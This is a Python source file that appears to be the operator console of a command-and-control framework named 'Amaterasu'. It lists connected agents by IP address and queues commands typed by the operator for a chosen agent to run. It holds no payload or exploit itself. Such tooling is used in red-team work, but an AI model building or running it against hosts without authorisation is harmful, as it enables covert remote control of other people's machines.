import threading
import server
from rich.prompt import Prompt
from ui import banner

def operator_shell():
    banner()
    console_help()

    while True:
        cmd = Prompt.ask("[bold red]c2[/bold red]").strip()

        if cmd == "agents":
            if not server.agents:
                print("No agents connected.")
            else:
                for aid, agent in server.agents.items():
                    print(f"[+] Agent {aid} @ {agent.addr[0]}")

        elif cmd.startswith("use "):
            try:
                aid = int(cmd.split()[1])
                agent = server.agents.get(aid)

                if not agent:
                    print("[-] Agent not found")
                    continue

                while True:
                    sub = Prompt.ask(f"[green]agent-{aid}[/green]").strip()

                    if sub == "back":
                        break

                    agent.queue.put(sub)

            except ValueError:
                print("Usage: use <agent_id>")

        elif cmd == "help":
            console_help()

        elif cmd == "exit":
            print("[*] Shutting down Amaterasu...")
            break

        else:
            print("unknown command")

def console_help():
    print("""
commands:
  agents        → list connected agents
  use <id>      → interact with agent
  back          → to return 
  help          → show this menu
  exit          → TO leave the enviroment
""")

if __name__ == "__main__":
    threading.Thread(target=server.start_server, daemon=True).start()
    operator_shell()


